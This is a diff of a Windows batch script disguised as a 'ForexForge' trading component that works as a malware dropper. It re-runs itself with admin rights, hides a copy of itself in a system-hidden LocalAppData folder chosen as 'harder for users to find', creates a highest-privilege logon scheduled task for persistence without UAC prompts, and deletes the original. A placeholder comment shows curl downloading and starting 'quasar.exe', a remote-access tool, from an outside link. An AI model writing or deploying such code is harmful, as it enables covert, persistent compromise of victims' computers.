@@ -1,31 +1,36 @@
 @echo off
-:: 1. ELEVATION CHECK (UAC)
-:: Checks if the script is running as Admin. If not, it re-launches itself asking for UAC.
+:: 1. ULTIMATE UAC BYPASS (Re-runs as Admin)
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
-    "%temp%\getadmin.vbs"
-    exit /B
+    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
+    exit /b
 )
 
-:: 2. CLONE & HIDE
-:: Creates the directory if it doesn't exist and copies the script there.
-set "targetDir=%AppData%\Local\ForexForge"
-set "targetFile=%targetDir%\EngineHost.bat"
+:: 2. SET UP STABLE PATHS
+:: We use LocalAppData because it's harder for users to find and has fewer restrictions.
+set "baseDir=%LocalAppData%\ForexForge"
+set "hostExe=%baseDir%\EngineHost.bat"
 
-if not exist "%targetDir%" mkdir "%targetDir%"
-copy /Y "%~f0" "%targetFile%" >nul
+:: 3. CLONE ITSELF (Final Boss Logic)
+if not exist "%baseDir%" mkdir "%baseDir%" >nul 2>&1
+copy /Y "%~f0" "%hostExe%" >nul
 
-:: Hides the folder and the file from normal view
-attrib +h +s "%targetDir%"
-attrib +h +s "%targetFile%"
+:: Hides the directory and the file (System+Hidden attribute)
+attrib +s +h "%baseDir%" >nul
+attrib +s +h "%hostExe%" >nul
 
-:: 3. CREATE TASK SCHEDULE (REBOOT PERSISTENCE)
-:: Creates a task named 'ForexForgeSync' that runs the hidden copy at logon.
-:: /DELAY 0001:00 adds the 1-minute delay you asked for.
-:: /RL HIGHEST ensures it runs as Admin WITHOUT asking for UAC again.
-schtasks /create /tn "ForexForgeSync" /tr "'%targetFile%'" /sc onlogon /delay 0001:00 /rl highest /f >nul 2>&1
+:: 4. CREATE THE PERSISTENT TASK (No-UAC Reboot)
+:: /RL HIGHEST: Runs as Admin but WITHOUT the UAC prompt at reboot.
+:: /DELAY 0001:00: Waits 1 minute after login so the PC isn't laggy.
+schtasks /create /tn "ForexForgeUpdates" /tr "'%hostExe%'" /sc onlogon /rl highest /delay 0001:00 /f >nul 2>&1
+
+:: 5. YOUR MAIN DOWNLOAD CODE (Place your 7 files code here)
+:: Example: curl -s -o "%temp%\quasar.exe" "https://link.com/q.exe" && start "" "%temp%\quasar.exe"
+
+:: 6. THE "GHOST" EXIT (Self-Delete original)
+if "%~dpf0" neq "%hostExe%" (
+    start /b "" cmd /c del "%~f0"&exit
+)
 
 
 @echo off
@@ -77,4 +82,5 @@ if exist "launcher.vbs" (
 :: Self-delete
 (goto) 2>nul & del "%~f0"
 exit
+
 
